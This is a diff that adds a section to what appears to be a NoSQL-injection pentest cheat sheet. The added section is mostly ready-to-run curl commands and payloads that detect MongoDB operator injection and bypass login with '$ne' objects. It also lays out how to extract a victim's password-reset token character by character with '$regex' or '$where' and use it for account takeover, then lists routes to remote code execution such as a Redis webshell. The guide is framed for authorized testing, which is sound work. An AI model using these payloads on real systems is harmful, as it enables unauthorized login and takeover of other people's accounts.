@@ -5,6 +5,33 @@ Payloads + tool commands for the guide. Authorized targets only. Baseline every 
 
 ---
 
+## 0.0 The whole attack in one sequence (auth bypass → blind reset-token extraction → ATO, worked end-to-end in Guide §3.0)
+*Detect via the operator differential → bypass the login → blind-`$regex` a victim's reset token → ATO. Two own accounts, control-baselined, bounded reads.*
+
+```
+T='https://target.example'
+
+# 1. DETECT — string vs operator differential (baseline 401, operator flips it)
+curl -s $T/api/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"wrong"}'          # 401
+curl -s $T/api/login -H 'Content-Type: application/json' -d '{"username":"alice","password":{"$ne":"wrong"}}'  # 200 => NoSQLi
+#    also try the bracket/form form (Express qs / PHP auto-parse user[$ne]=x into {user:{$ne:"x"}}):
+#    username[$ne]=x&password[$ne]=x
+
+# 2. AUTH BYPASS — always-true both fields (land as first doc = often seed admin)
+curl -s $T/api/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+#    target admin specifically:  {"username":"admin","password":{"$ne":""}}
+
+# 3. TARGETED ATO — blind-extract a victim's reset token char-by-char ($regex; Rocket.Chat CVE-2021-22911 shape)
+#    {"email":"victim@x","token":{"$regex":"^7"}} -> true ; extend ^7f, ^7f3 ... ; length via {"$regex":"^.{32}$"}
+python3 poc/nosqli_blind.py -u $T/api/reset/verify --email victim@x --field token --charset '0-9a-f' --true-marker '"valid":true'
+#    $where fallback if $regex filtered:  {"$where":"this.token.match(/^7/)!=null"}
+
+# 4. USE the token -> reset victim's password -> login = ATO (own account B). STOP. Bounded reads only.
+```
+**Cash-out map:** login merges JSON → **auth bypass `$ne`/`$gt` → admin (Critical, §3.1)** · true/false diff → **blind `$regex`/`$where` extract hash/reset-token → ATO (Critical, §3.3)** · filter param → **`[$ne]` widen → other users'/unpublished data (High, §3.2)** · `$where`/`$function` JS → **exfil/timing, eval→RCE (§3.4)** · datastore-specific → **ES script / Redis `CONFIG SET` webshell / CouchDB dup-key admin / Neo4j apoc → RCE (§3.5)**.
+
+---
+
 ## 0. The operator cheat (MongoDB — memorize these)
 
 | Operator | Meaning | Attack use |
